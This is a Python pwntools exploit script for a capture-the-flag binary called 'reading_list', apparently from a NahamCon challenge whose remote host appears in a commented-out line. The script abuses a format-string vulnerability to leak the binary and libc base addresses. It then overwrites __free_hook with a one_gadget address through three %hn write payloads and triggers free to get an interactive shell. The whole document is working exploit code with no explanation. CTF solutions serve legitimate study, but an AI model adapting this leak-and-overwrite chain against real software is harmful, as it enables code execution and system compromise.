from pwn import *
from pprint import pprint

elf = ELF("./reading_list")

libc = ELF("./libc")

def add_book(book_name):
	p.sendline(b'2')
	p.recvuntil(b'book name: ')
	p.sendline(book_name.encode())
	p.recvuntil(b"> ")

def rem_book(idx, write=False):
	p.sendline(b"3")

	p.recvline()
	p.recvline()

	books = carve_books(write)

	p.recvuntil(b": ")
	p.sendline(str(idx).encode())

	return books

def change_name(name):
	p.sendline(b"4")
	p.recvuntil(b"name: ")
	p.sendline(name)
	p.recvuntil(b"> ")

def carve_books(write):

	if write:
		return None

	books = p.recvuntil(b"\n\n").strip(b"\n\n")
	books = books.decode().split("\n")

	for i in range(len(books)):
		books[i] = "".join(list(books[i])[3:])

	return books


def get_book_list(write=False):
	p.sendline(b"1")
	p.recvline()
	books = carve_books(write)
	p.recvuntil(b"> ")
 
	return books

# exploit locally
p = elf.process()

# exploit remote
# p = remote("challenge.nahamcon.com", 30367)

# send name to start
p.recvuntil(b"name: ")
p.sendline(b"A"*8)
p.recvuntil(b"> ")

# get base addr of binary incase we needed it 
add_book("%11$p")
base = int(get_book_list()[0], 16) - 6116
elf.address = base
log.info(f"base: {hex(base)}")
rem_book(1)

# leak libc addr and calculate base
add_book("%23$p")
libc_base = int(get_book_list()[0], 16) - 8371 - 139264
libc.address = libc_base
log.info(f"libc: {hex(libc_base)}")
rem_book(1)

# get addr of __free_hook in libc
free_hook = libc.symbols['__free_hook']
log.info(f"free_hook: {hex(free_hook)}")

# calculate addr of one gadget to use
one_gadget = libc.address + 0xe3b31
log.info(f"og: {hex(one_gadget)}")

#######################################
# writes will be in series of two byes#
#######################################

# first two bytes
first = one_gadget - (one_gadget >> 16 << 16)
log.info(f"first write: {hex(first)}")

# second two bytes
second = (((one_gadget >> 16 << 16) - (one_gadget >> 32 << 32)) >> 16)
log.info(f"second write: {hex(second)}")

# third two bytes
third = (one_gadget >> 32)
log.info(f"third write: {hex(third)}")

# set name to address' of __free_hook for referencing from the stack
change_name(p64(free_hook)+p64(free_hook+2)+p64(free_hook+4)) 

# first write-what-where
payload  = f"%{str(first).rjust(6, '0')}c"
payload += "%0022$hn"
add_book(payload)

# second write-what-where
payload  = f"%{str(second).rjust(6, '0')}c"
payload += "%0023$hn"
add_book(payload)

# third write-what-where
payload  = f"%{str(third).rjust(6, '0')}c"
payload += "%0024$hn"
add_book(payload)

# trigger format string vuln from 'print_list' and call to 'free'
rem_book(1, write=True)

p.interactive()
